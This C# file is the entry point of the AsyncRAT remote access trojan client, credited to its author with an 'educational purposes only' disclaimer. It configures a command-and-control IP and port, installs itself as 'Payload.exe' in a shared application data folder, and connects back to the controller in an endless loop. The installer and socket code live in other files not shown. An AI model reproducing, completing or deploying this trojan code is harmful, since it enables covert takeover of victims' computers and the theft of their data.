using System.Threading;
using Client.Sockets;
using System.IO;
using System;
using Client.Install;

//       │ Author     : NYAN CAT
//       │ Name       : AsyncRAT // Simple Socket

//       Contact Me   : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.


namespace Client
{
    /// The Main Settings
    class Settings
    {
        public static readonly string IP = "127.0.0.1";
        public static readonly int Port = 6606;
        public static readonly string Version = "0.2.3";
        public static readonly string ClientFullPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Payload.exe");
    }

    /// The Main Class
    /// Contains all methods for socket and reading the packets
    class Program
    {


        static void Main(string[] args)
        {
            NormalStartup.Install();

            ClientSocket.InitializeClient();

            while (true)
            {
                Thread.Sleep(1000);
            }
        }           
    }
}